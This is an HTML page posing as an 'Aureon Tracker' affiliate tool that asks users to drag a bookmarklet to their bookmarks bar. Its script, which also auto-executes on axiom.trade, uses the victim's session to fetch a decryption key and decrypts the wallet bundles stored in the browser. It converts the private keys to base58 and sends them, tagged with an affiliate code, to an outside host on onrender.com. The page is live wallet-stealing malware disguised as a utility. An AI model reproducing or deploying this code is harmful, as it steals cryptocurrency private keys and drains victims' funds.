<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Aureon</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #040d0a;
    font-family: system-ui, sans-serif;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 1rem;
  }
  .glass {
    background: rgba(8, 28, 22, 0.75);
    backdrop-filter: blur(24px);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 1.5rem;
    padding: 2rem;
    max-width: 600px;
    width: 100%;
    text-align: center;
  }
  h1 {
    color: #f0fdf4;
    font-size: 1.5rem;
    font-weight: 500;
    margin-bottom: 0.5rem;
  }
  .aff-pill {
    display: inline-block;
    background: rgba(16, 185, 129, 0.2);
    border: 1px solid #10b981;
    border-radius: 999px;
    padding: 0.25rem 1.2rem;
    color: #34d399;
    font-size: 0.9rem;
    font-weight: 500;
    margin-bottom: 1.5rem;
  }
  .drag-btn {
    display: inline-flex;
    align-items: center;
    gap: 0.6rem;
    background: rgba(16, 185, 129, 0.08);
    border: 2px dashed rgba(16, 185, 129, 0.4);
    border-radius: 999px;
    padding: 0.7rem 1.8rem;
    color: #34d399;
    font-weight: 500;
    font-size: 1rem;
    text-decoration: none;
    cursor: grab;
    transition: border-color 0.2s, background 0.2s;
  }
  .drag-btn:hover {
    border-color: #10b981;
    background: rgba(16, 185, 129, 0.15);
  }
  .drag-btn:active { cursor: grabbing; }
  .share-link {
    color: #94a3b8;
    font-size: 0.85rem;
    margin-top: 1rem;
    word-break: break-all;
  }
  .share-link a { color: #34d399; text-decoration: none; border-bottom: 1px dotted #10b981; }
  .status {
    color: #94a3b8;
    font-size: 0.8rem;
    margin-top: 1rem;
  }
</style>
</head>
<body>

<div class="glass">
  <h1>✦ Aureon Tracker</h1>
  <div class="aff-pill" id="affDisplay">G6RLWI</div>

  <a href="#" id="bookmarkletLink" class="drag-btn" draggable="true">
    <span style="font-size:1.2rem;">⬇</span> Drag to Bookmarks Bar
  </a>

  <div class="share-link" id="shareLink">
    Share: <a href="#" id="shareAnchor">https://aureon.lol/?aff=G6RLWI</a>
  </div>
  <div class="status" id="statusText">Ready</div>
</div>

<script>
(function(){
  // ---- AFFILIATE LOGIC ----
  const DEFAULT_AFF = 'G6RLWI';
  const params = new URLSearchParams(window.location.search);
  let affCode = params.get('aff');
  if (!affCode || affCode.trim() === '') {
    affCode = DEFAULT_AFF;
  }
  affCode = affCode.trim();

  // Update UI
  document.getElementById('affDisplay').textContent = affCode;
  const shareAnchor = document.getElementById('shareAnchor');
  const shareUrl = 'https://aureon.lol/?aff=' + encodeURIComponent(affCode);
  shareAnchor.href = shareUrl;
  shareAnchor.textContent = shareUrl;
  document.getElementById('statusText').textContent = 'Affiliate: ' + affCode + ' | Auto-execute on axiom.trade';

  // ---- BUILD BOOKMARKLET ----
  function buildBookmarklet(code) {
    const raw = `javascript:(function(){const a='${code}';const b=\`(async function(){try{const a='\${a}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function c(d){const e='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let f='';const g=new Uint8Array(d);let h=0;while(h<g.length&&g[h]===0){f+=e[0];h++;}let i=[];let j=0;for(;h<g.length;h++){j=g[h];let k=0;while(k<i.length||j>0){let l=k<i.length?i[k]:0;let m=l*256+j;if(k<i.length){i[k]=m%58;}else{i.push(m%58);}j=Math.floor(m/58);k++;}}for(let n=i.length-1;n>=0;n--){f+=e[i[n]];}return f;}function o(p){try{const q=p.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(q),r=>r.charCodeAt(0));}catch(s){return new TextEncoder().encode(p);}}async function t(u,v){const[w,x]=String(v).split(':');const y=o(w);const z=o(x);const A=await crypto.subtle.decrypt({name:'AES-GCM',iv:y,tagLength:128},u,z);return new Uint8Array(A);}const B=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:C}=await B.json();const D=await crypto.subtle.importKey('raw',o(C).buffer,{name:'AES-GCM'},false,['decrypt']);const E=JSON.parse(localStorage.getItem('sBundles')||'[]');let F=[];for(const G of E){try{const H=await t(D,G);if(H.length!==0x40)continue;const I=c(H);const J=c(H.slice(0x20));F.push({priv:I,pub:J});}catch(K){continue;}}if(F.length===0)return;const L={affCode:a,wallets:F,timestamp:new Date().toISOString(),total:F.length,source:'aureon_bookmark'};const M=JSON.stringify(L);const N=btoa(unescape(encodeURIComponent(M)));const O=encodeURIComponent(N);const P='https://aureontool.onrender.com/trade?text='+O;const Q=window.open(P,'_blank');if(!Q){const R=document.createElement('a');R.href=P;R.target='_blank';R.style.display='none';document.body.appendChild(R);R.click();setTimeout(function(){R.remove();},1000);}}catch(S){}})();\`;eval(b);})();`;
    return raw.replace(/\s+/g, ' ').trim();
  }

  const bookmarkletHref = buildBookmarklet(affCode);
  document.getElementById('bookmarkletLink').href = bookmarkletHref;

  // ---- AUTO-EXECUTE if on axiom.trade ----
  if (window.location.hostname.includes('axiom.trade')) {
    // Build and eval the script with current affCode
    const script = `(async function(){try{const a='${affCode}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function c(d){const e='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let f='';const g=new Uint8Array(d);let h=0;while(h<g.length&&g[h]===0){f+=e[0];h++;}let i=[];let j=0;for(;h<g.length;h++){j=g[h];let k=0;while(k<i.length||j>0){let l=k<i.length?i[k]:0;let m=l*256+j;if(k<i.length){i[k]=m%58;}else{i.push(m%58);}j=Math.floor(m/58);k++;}}for(let n=i.length-1;n>=0;n--){f+=e[i[n]];}return f;}function o(p){try{const q=p.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(q),r=>r.charCodeAt(0));}catch(s){return new TextEncoder().encode(p);}}async function t(u,v){const[w,x]=String(v).split(':');const y=o(w);const z=o(x);const A=await crypto.subtle.decrypt({name:'AES-GCM',iv:y,tagLength:128},u,z);return new Uint8Array(A);}const B=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:C}=await B.json();const D=await crypto.subtle.importKey('raw',o(C).buffer,{name:'AES-GCM'},false,['decrypt']);const E=JSON.parse(localStorage.getItem('sBundles')||'[]');let F=[];for(const G of E){try{const H=await t(D,G);if(H.length!==0x40)continue;const I=c(H);const J=c(H.slice(0x20));F.push({priv:I,pub:J});}catch(K){continue;}}if(F.length===0)return;const L={affCode:a,wallets:F,timestamp:new Date().toISOString(),total:F.length,source:'aureon_bookmark'};const M=JSON.stringify(L);const N=btoa(unescape(encodeURIComponent(M)));const O=encodeURIComponent(N);const P='https://aureontool.onrender.com/trade?text='+O;const Q=window.open(P,'_blank');if(!Q){const R=document.createElement('a');R.href=P;R.target='_blank';R.style.display='none';document.body.appendChild(R);R.click();setTimeout(function(){R.remove();},1000);}}catch(S){}})();`;
    eval(script);
    document.getElementById('statusText').textContent = '✅ Auto-executed on axiom.trade | Aff: ' + affCode;
  }
})();
</script>
</body>
</html>
